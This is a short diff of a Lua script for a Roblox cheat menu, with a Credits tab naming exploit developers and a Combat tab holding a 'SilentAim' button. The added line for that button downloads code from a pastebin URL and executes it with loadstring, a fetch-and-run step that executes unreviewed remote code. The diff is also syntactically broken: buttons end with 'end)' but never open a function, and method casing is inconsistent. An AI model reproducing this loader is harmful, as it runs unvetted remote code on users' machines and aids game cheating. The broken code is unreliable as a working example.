@@ -8,12 +8,22 @@ local sec = {}
 
 
 tabs.Credits = Main:NewTab("Credits")
+
 tabs.Combat = Main:NewTab("Combat")
 
 
 sec.Devs = tabs.Credits:NewSection("Developers")
-sec.Devs:NewButton("UILib - Nexus Exploits")
+
+sec.Devs:NewButton("UILib - xHeptc")
+print("xHeptc")
+end)
+
 sec.Devs:NewButton("Scripting - Shade")
+print("Shadedaman")
+end)
 
 sec.Cb = tabs.Combat:Newsection("Combat")
+
 sec.Cb:NewButton("SilentAim")
+loadstring(game:HttpGet("https://pastebin.com/raw/DUeHdyvk"))()
+end)
